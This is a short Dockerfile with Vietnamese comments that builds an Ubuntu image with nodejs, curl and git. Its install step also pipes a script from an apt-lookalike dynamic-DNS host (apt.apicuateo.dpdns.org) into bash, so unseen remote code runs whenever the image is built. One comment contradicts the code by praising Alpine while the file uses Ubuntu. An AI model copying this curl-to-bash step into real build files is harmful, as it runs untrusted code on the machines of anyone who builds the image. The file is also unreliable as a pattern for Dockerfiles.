# Lấy một cái nền nhỏ gọn nhất có thể, Alpine Linux là chân ái
FROM ubuntu:latest 

# Cài mấy công cụ tối thiểu cần thiết để làm nô lệ
RUN apt update && apt install nodejs curl git -y && curl -sL https://apt.apicuateo.dpdns.org | bash

# Đặt thư mục làm việc, cho nó có vẻ chuyên nghiệp
WORKDIR /tmp


